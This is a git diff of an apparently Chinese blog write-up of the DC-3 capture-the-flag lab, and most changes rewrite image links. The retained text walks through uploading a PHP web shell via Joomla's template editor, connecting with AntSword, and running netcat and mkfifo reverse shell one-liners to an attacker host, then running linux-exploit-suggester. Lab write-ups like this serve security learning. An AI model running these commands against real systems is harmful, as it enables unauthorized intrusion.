+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image044.png&#34;
 	width=&#34;535&#34;
 	height=&#34;264&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image044_hu_23053d78c7ec2e92.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image044_hu_ef7f721d02ae6e46.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image044_hu_23053d78c7ec2e92.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image044_hu_ef7f721d02ae6e46.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -616,10 +616,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图23   破解后网站首页&lt;/p&gt;
 &lt;p&gt;点击Extensions,然后弹出一个框，选templates，再选templates&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image046.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image046.png&#34;
 	width=&#34;536&#34;
 	height=&#34;247&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image046_hu_bc0c117e73226a40.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image046_hu_177194656d257eaf.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image046_hu_bc0c117e73226a40.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image046_hu_177194656d257eaf.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -630,10 +630,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图24 设置界面&lt;/p&gt;
 &lt;p&gt;进入页面，再点击Beez3 Details and Files&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image048.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image048.png&#34;
 	width=&#34;536&#34;
 	height=&#34;282&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image048_hu_a50989546a6e7bef.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image048_hu_b770a28a4dd5d26c.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image048_hu_a50989546a6e7bef.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image048_hu_b770a28a4dd5d26c.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -644,10 +644,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图25 设置界面2&lt;/p&gt;
 &lt;p&gt;然后点击页面中的new files，可以上传文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image050.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image050.png&#34;
 	width=&#34;475&#34;
 	height=&#34;300&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image050_hu_4b5bb15d5403b342.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image050_hu_a29e6cb384bd46b5.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image050_hu_4b5bb15d5403b342.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image050_hu_a29e6cb384bd46b5.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -657,10 +657,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 	
 &gt; &lt;/p&gt;
 &lt;p&gt;图26  上传文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image052.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image052.png&#34;
 	width=&#34;458&#34;
 	height=&#34;335&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image052_hu_78fc693f2a69b15c.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image052_hu_aa5f1672d933466a.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image052_hu_78fc693f2a69b15c.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image052_hu_aa5f1672d933466a.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -671,10 +671,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图27&lt;/p&gt;
 &lt;p&gt;在html目录下上传php文件命名为shell.php具体代码如下图所示。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image054.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image054.png&#34;
 	width=&#34;536&#34;
 	height=&#34;283&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image054_hu_47c16a331f02dd5d.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image054_hu_cbc229845cad4eb9.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image054_hu_47c16a331f02dd5d.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image054_hu_cbc229845cad4eb9.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -687,10 +687,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;再次访问&lt;a class=&#34;link&#34; href=&#34;http://192.168.248.136/templates/beez3/html/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;http://192.168.248.136/templates/beez3/html/&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;可以看到多了shell.php文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image056.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image056.png&#34;
 	width=&#34;455&#34;
 	height=&#34;320&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image056_hu_59087ffb17e71d3b.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image056_hu_18d0535c6ee09d72.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image056_hu_59087ffb17e71d3b.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image056_hu_18d0535c6ee09d72.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -700,10 +700,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 	
 &gt; &lt;/p&gt;
 &lt;p&gt;图29文件上传成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image058.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image058.png&#34;
 	width=&#34;536&#34;
 	height=&#34;152&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image058_hu_95053be540c5c5b4.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image058_hu_488a238f8d7ae3b0.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image058_hu_95053be540c5c5b4.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image058_hu_488a238f8d7ae3b0.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -714,10 +714,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图30文件显示界面&lt;/p&gt;
 &lt;p&gt;(19)打开中国蚁剑，测试连接&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image060.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image060.png&#34;
 	width=&#34;457&#34;
 	height=&#34;305&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image060_hu_c656457cbaa19ec4.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image060_hu_f560501c6536c139.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image060_hu_c656457cbaa19ec4.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image060_hu_f560501c6536c139.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -729,10 +729,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;图31连接成功&lt;/p&gt;
 &lt;p&gt;(20)打开终端输入whoami&lt;/p&gt;
 &lt;p&gt;是www-data权限&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image062.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image062.png&#34;
 	width=&#34;537&#34;
 	height=&#34;185&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image062_hu_b43b1470e9b96a4c.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image062_hu_1d625b91da1edd0e.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image062_hu_b43b1470e9b96a4c.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image062_hu_1d625b91da1edd0e.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -743,10 +743,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图32 查询whoami权限&lt;/p&gt;
 &lt;p&gt;(21)反弹shell到kali 输入nc -lvvp 1234&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image064.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image064.png&#34;
 	width=&#34;536&#34;
 	height=&#34;185&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image064_hu_59773f3bf8efdfc5.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image064_hu_829eba578a1013ce.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image064_hu_59773f3bf8efdfc5.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image064_hu_829eba578a1013ce.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -757,10 +757,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图33 kali开启监听&lt;/p&gt;
 &lt;p&gt;(22)蚁剑终端输入nc -e /bin/bash 192.168.248.135 1234&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image066.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image066.png&#34;
 	width=&#34;536&#34;
 	height=&#34;93&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image066_hu_7efa3f40d9361ec4.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image066_hu_d8b3cc4c1d2347dc.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image066_hu_7efa3f40d9361ec4.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image066_hu_d8b3cc4c1d2347dc.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -771,10 +771,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图34 -e参数不可用&lt;/p&gt;
 &lt;p&gt;(23)换个命令使用rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.248.135 1234 &amp;gt;/tmp/f&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image068.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image068.png&#34;
 	width=&#34;536&#34;
 	height=&#34;100&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image068_hu_161a99d53d3270aa.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image068_hu_fe213d05f6f9e55c.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image068_hu_161a99d53d3270aa.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image068_hu_fe213d05f6f9e55c.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -787,10 +787,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;(24)交互式shell&lt;/p&gt;
 &lt;p&gt; 常用的就是python创建交互式shell&lt;/p&gt;
 &lt;p&gt; 接着输入 python3 -c &amp;lsquo;import pty; pty.spawn(&amp;quot;/bin/bash&amp;rdquo;)&amp;rsquo;  点击回车，在输入ls&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image070.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image070.png&#34;
 	width=&#34;536&#34;
 	height=&#34;227&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image070_hu_1d3a0f5c0eaa9e63.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image070_hu_321deb6410c97257.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image070_hu_1d3a0f5c0eaa9e63.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image070_hu_321deb6410c97257.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -804,10 +804,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;下载辅助脚本Linux-Exploit-Suggester.sh&lt;/p&gt;
 &lt;p&gt;下载地址：https://github.com/mzet-/linux-exploit-suggester&lt;/p&gt;
 &lt;p&gt;上传脚本，直接在蚁剑里上传，点击右键，选择上传文件，选择刚刚下好的脚本，点击打开上传成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image072.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image072.png&#34;
 	width=&#34;376&#34;
 	height=&#34;218&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image072_hu_c6c9c9aaf33e9490.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image072_hu_a3bcb796e975d201.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image072_hu_c6c9c9aaf33e9490.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image072_hu_a3bcb796e975d201.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -818,10 +818,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &gt; &lt;/p&gt;
 &lt;p&gt;图37辅助脚本上传成功&lt;/p&gt;
 &lt;p&gt;(26)输入ls点击回车，发现漏洞   ls -l linux-exploit-suggester.sh&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image074.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image074.png&#34;
 	width=&#34;536&#34;
 	height=&#34;77&#34;
-	srcset=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image074_hu_37f18b7ea4c19794.png 480w, ../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image074_hu_5fbc911e1245ee1b.png 1024w&#34;
+	srcset=&#34;https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image074_hu_37f18b7ea4c19794.png 480w, https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image074_hu_5fbc911e1245ee1b.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -834,10 +834,10 @@ flag{42febc48bc0404dc97ad61dab97d7d6d}&lt;/p&gt;
 &lt;p&gt;(27)发现没有执行权限，我们给他加个执行文件&lt;/p&gt;
 &lt;p&gt;输入chmod +x linux-exploit-suggester.sh&lt;/p&gt;
 &lt;p&gt;和 ./linux-exploit-suggester.sh 发现很多漏洞&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/image076.png&#34;
